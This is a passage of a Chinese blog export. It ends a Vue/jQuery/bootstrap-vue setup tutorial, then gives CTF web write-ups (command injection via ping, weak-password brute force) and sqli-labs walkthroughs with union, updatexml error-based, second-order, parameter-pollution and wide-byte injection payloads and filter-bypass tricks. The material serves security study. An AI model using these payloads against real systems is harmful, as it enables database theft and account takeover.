string">'vue-navigation'</span>Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>Navigation<span class="token punctuation">,</span> <span class="token punctuation">{</span>router<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>App.vue</strong></p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>navigation</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>router-view</span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>router-view</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>navigation</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span></code></pre><h4 id="监听路由变化"><a href="#监听路由变化" class="headerlink" title="监听路由变化"></a>监听路由变化</h4><p>上述配置好后，在vue组件中加入以下js语句，</p><pre class=" language-js"><code class="language-js">activated<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"hhhhhh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//路由每变换一次输出一次hhhhhh</span><span class="token punctuation">}</span></code></pre><h3 id="引入jquery"><a href="#引入jquery" class="headerlink" title="引入jquery"></a>引入jquery</h3><p>在项目根目录下运行以下命令：</p><pre class=" language-shell"><code class="language-shell">npm isntall jquery --save</code></pre><p>在main.js中引入以下代码:</p><pre class=" language-js"><code class="language-js"><span class="token keyword">import</span> <span class="token string">'jquery'</span></code></pre><p>在对应xx.vue中引入</p><pre class=" language-js"><code class="language-js"><span class="token keyword">import</span> $ <span class="token keyword">from</span> <span class="token string">'jquery'</span></code></pre><p>在xx.vue文件里进行测试：</p><pre class=" language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>$<span class="token punctuation">)</span></code></pre><h3 id="引入bootstrap-vue"><a href="#引入bootstrap-vue" class="headerlink" title="引入bootstrap-vue"></a>引入bootstrap-vue</h3><pre class=" language-shell"><code class="language-shell">npm install bootstrap-vue bootstrap axios</code></pre><h5 id="设置BootstrapVue"><a href="#设置BootstrapVue" class="headerlink" title="设置BootstrapVue"></a>设置BootstrapVue</h5><p>main.js:</p><pre class=" language-js"><code class="language-js"><span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token keyword">import</span> App <span class="token keyword">from</span> <span class="token string">'./App.vue'</span><span class="token keyword">import</span> BootstrapVue <span class="token keyword">from</span> <span class="token string">'bootstrap-vue'</span><span class="token keyword">import</span> <span class="token string">'bootstrap/dist/css/bootstrap.css'</span><span class="token keyword">import</span> <span class="token string">'bootstrap-vue/dist/bootstrap-vue.css'</span>Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>BootstrapVue<span class="token punctuation">)</span>Vue<span class="token punctuation">.</span>config<span class="token punctuation">.</span>productionTip <span class="token operator">=</span> <span class="token boolean">false</span><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  render<span class="token punctuation">:</span> h <span class="token operator">=</span><span class="token operator">></span> <span class="token function">h</span><span class="token punctuation">(</span>App<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">$mount</span><span class="token punctuation">(</span><span class="token string">'#app'</span><span class="token punctuation">)</span></code></pre><h3 id="b-table-通过row-clicked获取表单信息"><a href="#b-table-通过row-clicked获取表单信息" class="headerlink" title="b-table 通过row-clicked获取表单信息"></a>b-table 通过row-clicked获取表单信息</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">@row-clicked</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>onRowClicked<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name"><span class="token namespace">v-slot:</span>row-details</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        //样式      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><p>要为items中的每个Json数据添加以下字段：</p><pre><code>_showDetails:false</code></pre><p>添加方法：</p><pre class=" language-js"><code class="language-js"> methods<span class="token punctuation">:</span><span class="token punctuation">{</span> <span class="token function">onRowClicked</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span>index<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">{</span>        item<span class="token punctuation">.</span>_showDetails <span class="token operator">=</span> <span class="token operator">!</span>item<span class="token punctuation">.</span>_showDetails<span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="引入外部非ES6文件"><a href="#引入外部非ES6文件" class="headerlink" title="引入外部非ES6文件"></a>引入外部非ES6文件</h3><pre class=" language-js"><code class="language-js"> <span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> newScripts <span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"js/bubble/jquery.min.js"</span><span class="token punctuation">,</span>            <span class="token string">"js/bubble/d3.min.js"</span><span class="token punctuation">,</span>            <span class="token string">"js/bubble/d3-transform.js"</span><span class="token punctuation">,</span>            <span class="token string">"js/bubble/extarray.js"</span><span class="token punctuation">,</span>            <span class="token string">"js/bubble/misc.js"</span><span class="token punctuation">,</span>            <span class="token string">"js/bubble/micro-observer.js"</span><span class="token punctuation">,</span>            <span class="token string">"js/bubble/microplugin.js"</span><span class="token punctuation">,</span>            <span class="token string">"js/bubble/bubble-chart.js"</span><span class="token punctuation">,</span>            <span class="token string">"js/bubble/central-click.js"</span><span class="token punctuation">,</span>            <span class="token string">"js/bubble/lines.js"</span><span class="token punctuation">,</span>            <span class="token string">"js/bubble/index.js"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//迭代加载,callback为全部加载完成后的回调函数</span>        <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token function">scriptRecurse</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span> callback<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>count <span class="token operator">==</span> newScripts<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">{</span>        callback <span class="token operator">&amp;&amp;</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">loadScript</span><span class="token punctuation">(</span>newScripts<span class="token punctuation">[</span>count<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        document<span class="token punctuation">.</span><span class="token function">getElementsByClassName</span><span class="token punctuation">(</span><span class="token string">'bubbleChart'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">+</span><span class="token operator">=</span>newScripts<span class="token punctuation">[</span>count<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">";&lt;br>"</span><span class="token punctuation">;</span>        <span class="token function">scriptRecurse</span><span class="token punctuation">(</span><span class="token operator">++</span>count<span class="token punctuation">,</span> callback<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">loadScript</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">var</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        script<span class="token punctuation">.</span>type <span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token punctuation">;</span>        script<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>        script<span class="token punctuation">.</span>onload <span class="token operator">=</span> script<span class="token punctuation">.</span>onreadystatechange <span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>script<span class="token punctuation">.</span>readyState <span class="token operator">||</span><span class="token string">'loaded'</span><span class="token operator">===</span> script<span class="token punctuation">.</span>readyState <span class="token operator">||</span><span class="token string">'complete'</span><span class="token operator">===</span> script<span class="token punctuation">.</span>readyState<span class="token punctuation">)</span><span class="token punctuation">{</span>        fn <span class="token operator">&amp;&amp;</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        script<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>        document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>       <span class="token punctuation">}</span><span class="token punctuation">,</span></code></pre><blockquote><p>js文件需要同步加载（按顺序）,html中直接以CDN的形式引入script标签默认是以同步的方式加载，其余以插入元素的形式插入script标签的形式都是异步执行的（刷新会获得不同的效果以及错误），所以外部非es6js文件在vue引入必须进行阻塞实现同步渲染</p></blockquote><h2 id="Vue-Jquery库推荐"><a href="#Vue-Jquery库推荐" class="headerlink" title="Vue Jquery库推荐"></a>Vue Jquery库推荐</h2><ul><li>粒子动态效果 vue-particles</li></ul>]]></content>
      
      
      <categories>
          
          <category> 框架使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界(1)</title>
      <link href="/2020/07/28/attack1/"/>
      <url>/2020/07/28/attack1/</url>
      
        <content type="html"><![CDATA[<h5 id="1-view-source"><a href="#1-view-source" class="headerlink" title="1 view source"></a>1 view source</h5><p>右键鼠标不管用：查看源码</p><ul><li>按F12查看源码</li><li>view-source:<a href="http://IP" target="_blank" rel="noopener">http://IP</a> 查看源码</li></ul><h5 id="2-post"><a href="#2-post" class="headerlink" title="2 post"></a>2 post</h5><p>http两种请求方式：</p><p>a: <a href="http://IP?a=1" target="_blank" rel="noopener">http://IP?a=1</a></p><p>b:使用firefox的hackbar插件发送post请求b=2</p><h5 id="3-robots"><a href="#3-robots" class="headerlink" title="3 robots"></a>3 robots</h5><p>Robots协议</p><p>robots.txt协议：robots协议也叫robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。(摘自百度百科)</p><p>robots.txt一般存于Web网站根目录下：</p><p><img src="https://pic.downk.cc/item/5f1fe3f614195aa594c18435.png" alt=""></p><p>User-agent: * 这里的<em>代表的所有的搜索引擎种类，</em>是一个通配符</p><ul><li><p>Disallow: / 这里定义是禁止爬寻站点所有的内容</p></li><li><p>Disallow: /admin/ 这里定义是禁止爬寻admin目录下面的目录</p></li></ul><p><img src="https://pic.downk.cc/item/5f1fe48614195aa594c1f574.png" alt=""></p><h5 id="4-backup"><a href="#4-backup" class="headerlink" title="4 backup"></a>4 backup</h5><p>备份文件的后缀一般为.swp/.bak，这里尝试<a href="http://IP/index.php.bak" target="_blank" rel="noopener">http://IP/index.php.bak</a>  查看文件源码获取flag</p><h5 id="5-cookie"><a href="#5-cookie" class="headerlink" title="5 cookie"></a>5 cookie</h5><p>查看http请求</p><p><img src="https://pic.downk.cc/item/5f1fe73d14195aa594c480e0.png" alt=""></p><p>访问cookie.php</p><p><img src="https://pic.downk.cc/item/5f1fe76714195aa594c4c8f6.png" alt=""></p><h5 id="6-disabled-button"><a href="#6-disabled-button" class="headerlink" title="6 disabled button"></a>6 disabled button</h5><p>不能按下按钮</p><p>不能按下可能是有前端disabled属性，查看源码表单确实有disabled属性，将该属性删除即可。</p><h5 id="7-weak-auth"><a href="#7-weak-auth" class="headerlink" title="7 weak auth"></a>7 weak auth</h5><ol><li>查看源码</li></ol><p><img src="https://pic.downk.cc/item/5f1feee514195aa594cd0f6d.png" alt=""></p><ol start="2"><li>访问./check.php</li></ol><p><img src="https://pic.downk.cc/item/5f1fef2614195aa594cd7ec4.png" alt=""></p><ol start="3"><li><p>可知需要字典爆破，随便输入用户名与密码登录后，显示需要用admin进行登录，可知用户名需固定为admin,使用字典对密码进行爆破。此处可使用kali自带字典 /usr/share/wordlists</p><p><img src="https://pic.downk.cc/item/5f1ff22d14195aa594d0c7b4.png" alt=""></p></li><li><p>admin@123456，登录后得到flag</p></li></ol><h5 id="8-command-execution"><a href="#8-command-execution" class="headerlink" title="8 command_execution"></a>8 command_execution</h5><p>关于命令执行，windows或linux下:</p><ul><li><p>command1 &amp;&amp; command2 先执行command1后执行command2</p></li><li><p>command1 | command2 只执行command2</p></li><li><p>command1 &amp; command2 先执行command2后执行command1</p></li></ul><p>ping功能没有写waf：以下前方相当于省略了ping 命令</p><pre><code>127.0.0.1 //正常127.0.0.1 &amp; ls  //正常有回显127.0.0.1 &amp; find / -name &quot;*.txt&quot;  //查找所有.txt文件，找到flag文件127.0.0.1 &amp; cat /home/flag.txt //获取flag.txt文件的内容</code></pre><h5 id="9-simple-php"><a href="#9-simple-php" class="headerlink" title="9 simple_php"></a>9 simple_php</h5><pre><code>&lt;?phpshow_source(__FILE__);include(&quot;config.php&quot;);$a=@$_GET[&#39;a&#39;];$b=@$_GET[&#39;b&#39;];if($a==0 and $a){   //a为弱比较，开头为0后面要有字母    echo $flag1;}if(is_numeric($b)){ //b如果为数字    exit();}if($b&gt;1234){  //b必须要大于1234    echo $flag2;}?&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高阶sql注入</title>
      <link href="/2020/07/22/sqli-labs2/"/>
      <url>/2020/07/22/sqli-labs2/</url>
      
        <content type="html"><![CDATA[<h2 id="1-过滤字符"><a href="#1-过滤字符" class="headerlink" title="1.过滤字符"></a>1.过滤字符</h2><h3 id="1-1-过滤注释符号"><a href="#1-1-过滤注释符号" class="headerlink" title="1.1 过滤注释符号"></a>1.1 过滤注释符号</h3><h4 id="1-1-1-Less-23"><a href="#1-1-1-Less-23" class="headerlink" title="1.1.1 Less-23"></a>1.1.1 Less-23</h4><h5 id="1-判断类型"><a href="#1-判断类型" class="headerlink" title="1.判断类型"></a>1.判断类型</h5><ul><li>get型注入</li><li>有回显 (联合注入)</li><li>有错误提示</li></ul><p>综上考虑联合注入</p><h5 id="2-找注入点"><a href="#2-找注入点" class="headerlink" title="2. 找注入点"></a>2. 找注入点</h5><pre><code>?id=1 //正常?id=1&#39; //报错?id=1&#39; and 1=1--+ //报错?id=1&#39; and 1=2--+ //报错</code></pre><p>此时判断注释符号可能被过滤，尝试加入第二个‘</p><pre><code>?id=1&#39; and &#39;1&#39;=&#39;1   //正常?id=1&#39; and &#39;1&#39;=&#39;2   //错误</code></pre><p>由上可知注释符号被过滤，需采用’ 进行注入</p><h5 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h5><pre><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);    if($row)    {      echo &#39;&lt;font color= &quot;#0000ff&quot;&gt;&#39;;          echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];      echo &quot;&lt;br&gt;&quot;;      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];      echo &quot;&lt;/font&gt;&quot;;      }    else     {    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;    print_r(mysql_error());    echo &quot;&lt;/font&gt;&quot;;      }}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}?&gt;</code></pre><h5 id="3-判断字段数"><a href="#3-判断字段数" class="headerlink" title="3. 判断字段数"></a>3. 判断字段数</h5><pre><code>?id=1&#39; order by 3,&#39;1    //正常?id=1&#39; order by 4,&#39;1    //错误</code></pre><p><img src="https://pic.downk.cc/item/5f18e9a914195aa594dded34.png" alt=""></p><h4 id="4-判断显示位"><a href="#4-判断显示位" class="headerlink" title="4. 判断显示位"></a>4. 判断显示位</h4><pre><code>?id=-1&#39; union select 1,2,&#39;3</code></pre><p><img src="https://pic.downk.cc/item/5f18e9f214195aa594de109f.png" alt=""></p><h5 id="5-用户名-密码-数据库版本号-数据库"><a href="#5-用户名-密码-数据库版本号-数据库" class="headerlink" title="5.用户名/密码/数据库版本号/数据库"></a>5.用户名/密码/数据库版本号/数据库</h5><pre><code>?id=-1&#39; union select 1,user(),database()&#39;</code></pre><p><img src="https://pic.downk.cc/item/5f18ea9214195aa594de6023.png" alt=""></p><h5 id="6-爆表"><a href="#6-爆表" class="headerlink" title="6.爆表"></a>6.爆表</h5><pre><code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security</code></pre><p><img src="https://pic.downk.cc/item/5f18eb6c14195aa594dec7f2.png" alt=""></p><h5 id="7-爆列"><a href="#7-爆列" class="headerlink" title="7. 爆列"></a>7. 爆列</h5><pre><code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users</code></pre><p><img src="https://pic.downk.cc/item/5f18ebf214195aa594df042b.png" alt=""></p><h5 id="8-爆数据"><a href="#8-爆数据" class="headerlink" title="8.爆数据"></a>8.爆数据</h5><pre><code>?id=-1&#39; union select 1,username,password from users where id =&#39;3</code></pre><p><img src="https://pic.downk.cc/item/5f18ec7714195aa594df435f.png" alt=""></p><h3 id="1-2-过滤逻辑运算符"><a href="#1-2-过滤逻辑运算符" class="headerlink" title="1.2 过滤逻辑运算符"></a>1.2 过滤逻辑运算符</h3><p>主要过滤or/and等字符，主要有以下几种处理方式：</p><ul><li><p>大小写变形 Or,OR,oR </p></li><li><p>编码，hex，urlencode </p></li><li><p>添加注释/<em>or</em>/ </p></li><li><p>利用符号 and=&amp;&amp;    or=||</p></li></ul><h4 id="1-2-1-Less-25a"><a href="#1-2-1-Less-25a" class="headerlink" title="1.2.1 Less-25a"></a>1.2.1 Less-25a</h4><h5 id="1-判断类型-1"><a href="#1-判断类型-1" class="headerlink" title="1.判断类型"></a>1.判断类型</h5><ul><li>get型注入</li><li>有回显</li><li>无错误提示</li></ul><p>综上考虑联合注入</p><h5 id="2-找注入点-1"><a href="#2-找注入点-1" class="headerlink" title="2.找注入点"></a>2.找注入点</h5><pre><code>?id=1&#39;  //错误?id=1&#39;--+ //错误，可能过滤注释符号?id=1&#39; and &#39;1&#39;=&#39;1 //错误,可能过滤逻辑运算符?id=1&#39; &amp;&amp; 1=1--+ //错误?id=1&#39; &amp;&amp; &#39;1&#39;=&#39;1  </code></pre><h3 id="1-3-过滤空格"><a href="#1-3-过滤空格" class="headerlink" title="1.3 过滤空格"></a>1.3 过滤空格</h3><blockquote><p>注：关键字过滤也要随之更改空格格式</p></blockquote><ul><li><p>%09  TAB 键（水平） </p></li><li><p>%0a  新建一行 </p></li><li><p>%0c  新的一页 </p></li><li><p>%0d  return 功能 </p></li><li><p>%0b TAB 键（垂直） </p></li><li><p>%a0  空格</p></li></ul><h3 id="1-4-过滤sql语句关键字"><a href="#1-4-过滤sql语句关键字" class="headerlink" title="1.4 过滤sql语句关键字"></a>1.4 过滤sql语句关键字</h3><h4 id="1-4-1-Less-27"><a href="#1-4-1-Less-27" class="headerlink" title="1.4.1 Less-27"></a>1.4.1 Less-27</h4><h5 id="1-判断类型-2"><a href="#1-判断类型-2" class="headerlink" title="1.判断类型"></a>1.判断类型</h5><ul><li>get型注入</li><li>有回显</li><li>有错误提示</li></ul><p>综上考虑联合注入</p><h5 id="2-找注入点-确认过滤符号"><a href="#2-找注入点-确认过滤符号" class="headerlink" title="2.找注入点,确认过滤符号"></a>2.找注入点,确认过滤符号</h5><pre><code>?id=1&#39; //报错?id=1&#39;--+ //报错，可能是过滤--+?id=1&#39; and &#39;1&#39;=&#39;1  //正常，确认过滤--+，不过滤逻辑运算符</code></pre><h5 id="3-字段数"><a href="#3-字段数" class="headerlink" title="3.字段数"></a>3.字段数</h5><pre><code>?id=0&#39;%a0order%a0by%a04||&#39;1   //空白</code></pre><p>字段爆不出，考虑Updatexml()错误盲注</p><h5 id="4-爆库"><a href="#4-爆库" class="headerlink" title="4. 爆库"></a>4. 爆库</h5><pre><code>?id=1&#39;%a0and%a0updatexml(1,concat(0x7e,database(),0x7e),1)||&#39;1</code></pre><p><img src="https://pic.downk.cc/item/5f191eb514195aa59407d4d5.png" alt=""></p><p>爆表爆字段爆数据同基于错误的盲注，只不过在语句后要加上||’1</p><h2 id="2-二阶注入"><a href="#2-二阶注入" class="headerlink" title="2.二阶注入"></a>2.二阶注入</h2><h3 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h3><ol><li><p>黑客通过构造数据的形式，在浏览器或者其他软件中提交 HTTP 数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的 SQL 语句或者命令。 </p></li><li><p>服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</p></li><li><p>黑客向服务端发送第二个与第一次不相同的请求数据信息。 </p></li><li><p>服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的 SQL 语句或者命令在服务端环境中执行。 </p></li><li><p>服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注 入漏洞利用是否成功。</p></li></ol><h3 id="2-2-从注册入手"><a href="#2-2-从注册入手" class="headerlink" title="2.2 从注册入手"></a>2.2 从注册入手</h3><h4 id="2-1-1-Less-24"><a href="#2-1-1-Less-24" class="headerlink" title="2.1.1 Less-24"></a>2.1.1 Less-24</h4><h5 id="1-判断类型-3"><a href="#1-判断类型-3" class="headerlink" title="1.判断类型"></a>1.判断类型</h5><ul><li>post型注入</li><li>无回显</li><li>有错误提示</li></ul><p>综上考虑基于错误的盲注</p><h5 id="2-找注入点-2"><a href="#2-找注入点-2" class="headerlink" title="2. 找注入点"></a>2. 找注入点</h5><p>尝试所有注入且考虑注释符号被过滤，均尝试不成功，于是考虑二阶注入。</p><h5 id="3-注册新用户"><a href="#3-注册新用户" class="headerlink" title="3. 注册新用户"></a>3. 注册新用户</h5><p><img src="https://pic.downk.cc/item/5f18f17814195aa594e2feaa.png" alt=""></p><h5 id="4-使用上述新建的用户登录并修改密码"><a href="#4-使用上述新建的用户登录并修改密码" class="headerlink" title="4. 使用上述新建的用户登录并修改密码"></a>4. 使用上述新建的用户登录并修改密码</h5><p>查看修改密码源码：</p><pre><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;;</code></pre><p>当我们使用admin’#用户进行登录时，修改密码的sql语句变成：</p><pre><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; &quot;;</code></pre><p>上述语句即可随意修改admin的密码</p><h2 id="3-参数污染"><a href="#3-参数污染" class="headerlink" title="3. 参数污染"></a>3. 参数污染</h2><h3 id="3-1-服务器两层架构"><a href="#3-1-服务器两层架构" class="headerlink" title="3.1 服务器两层架构"></a>3.1 服务器两层架构</h3><p><img src="https://pic.downk.cc/item/5f192fd714195aa59414c1c4.png" alt=""></p><ul><li>服务器端有两个部分：第一部分为 tomcat 为引擎的 jsp 型服务器，第二部分为 apache为引擎的 php 服务器，真正提供 web 服务的是 php 服务器。</li><li>工作流程为：client 访问服务器,能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。 </li></ul><h3 id="3-2-场景应用"><a href="#3-2-场景应用" class="headerlink" title="3.2 场景应用"></a>3.2 场景应用</h3><p>index.jsp?id=1&amp;id=2 请求，针对3.1图中的服务器配置情况，客户端请求首先过 tomcat，tomcat 解析第一个参数，接下来 tomcat 去请求 apache（php） 服务器，apache 解析最后一个参数。最终返回客户端的是2这个参数，因为实际上提供服务的是apache(php)服务器，返回的数据也应该是 apache 处理的数据。为什么还要有tomcat服务器呢？</p><ul><li><p>我们往往在 tomcat 服务器处做数据过滤和处理，功能类似为一 </p><p>个 WAF。</p></li></ul><p>而正因为解析参数的不同，我们此处可以利用该原理绕过 WAF 的检测。该用法就 是 HPP（HTTP Parameter Pollution），http 参数污染攻击的一个应用。HPP 可对服务器和客 户端都能够造成一定的威胁</p><h3 id="3-3-实例"><a href="#3-3-实例" class="headerlink" title="3.3 实例"></a>3.3 实例</h3><h4 id="3-3-1-Less-29"><a href="#3-3-1-Less-29" class="headerlink" title="3.3.1 Less-29"></a>3.3.1 Less-29</h4><p>查看apache服务器的Index.php源码，如图所示</p><p><img src="https://pic.downk.cc/item/5f19337314195aa59416f44a.png" alt=""></p><p>由上述源码可知，apache服务器只对tomcat的参数进行了处理，所以我们可以利用第二个参数进行注入攻击</p><pre><code>?id=1&amp;id=-1&#39; union select 1,user(),3--+</code></pre><h2 id="4-宽字节注入"><a href="#4-宽字节注入" class="headerlink" title="4. 宽字节注入"></a>4. 宽字节注入</h2><h3 id="4-1-原理概述"><a href="#4-1-原理概述" class="headerlink" title="4.1 原理概述"></a>4.1 原理概述</h3><p>原理：mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思路是将 ‘ 转换为 \’ 。我们绕过过滤的思路就是把’前面的\去除掉：</p><ul><li>%df 吃掉 \ 具体的原因是 urlencode(\ ‘)= %5c%27，我们在%5c%27 前面添加%df，形成%df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此时%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。</li><li>将 \’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的%5c 会被前面的%5c给注释掉。这也是 bypass 的一种方法。</li></ul><blockquote><p>注：此种情况下若使用联合注入，所有字段的内容都要使用GBK编码才能成功攻击，如table_schema=’security’要换成table_schema=0x7365637572697479，且宽字节注入中get方法与post方法采取的方法不同</p></blockquote><h3 id="4-2-源码分析"><a href="#4-2-源码分析" class="headerlink" title="4.2 源码分析"></a>4.2 源码分析</h3><pre><code>function check_addslashes($string){    $string = preg_replace(&#39;/&#39;. preg_quote(&#39;\\&#39;) .&#39;/&#39;, &quot;\\\\\\&quot;, $string);          //escape any backslash    $string = preg_replace(&#39;/\&#39;/i&#39;, &#39;\\\&#39;&#39;, $string);                               //escape single quote with a backslash    $string = preg_replace(&#39;/\&quot;/&#39;, &quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash    return $string;}// take the variables if(isset($_GET[&#39;id&#39;])){$id=check_addslashes($_GET[&#39;id&#39;]);</code></pre><p>此处过滤函数采用addslashes()，addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 </p><p>预定义字符是： </p><ul><li><p>单引号（’） </p></li><li><p>双引号（”） </p></li><li><p>反斜杠（\） </p></li></ul><h3 id="4-3-实例"><a href="#4-3-实例" class="headerlink" title="4.3 实例"></a>4.3 实例</h3><h4 id="4-3-1-Less-32-get方法"><a href="#4-3-1-Less-32-get方法" class="headerlink" title="4.3.1 Less-32(get方法)"></a>4.3.1 Less-32(get方法)</h4><h5 id="1-判断类型-4"><a href="#1-判断类型-4" class="headerlink" title="1.判断类型"></a>1.判断类型</h5><ul><li>get型注入(url数据会通过URLencode)</li><li>有回显</li><li>有错误提示</li></ul><h5 id="2-找注入点-3"><a href="#2-找注入点-3" class="headerlink" title="2.找注入点"></a>2.找注入点</h5><pre><code>?id=1&#39; //正常?id=1&quot; //正常</code></pre><p>由上图可知过滤引号，此处采取%df吃\的方法</p><pre><code>?id=1%df&#39; //错误</code></pre><p><img src="https://pic.downk.cc/item/5f19386514195aa5941ab943.png" alt=""></p><p>正常报错，继续寻找注入点</p><pre><code>?id=1%df&#39; and 1=1--+  //正常?id=1%df&#39; and 1=2--+   //返回空串</code></pre><p>综上，注入点为?id=1%df’ 且不过滤空格逻辑运算符注释</p><h5 id="3-爆列"><a href="#3-爆列" class="headerlink" title="3. 爆列"></a>3. 爆列</h5><pre><code>?id=-1%df&#39; union select 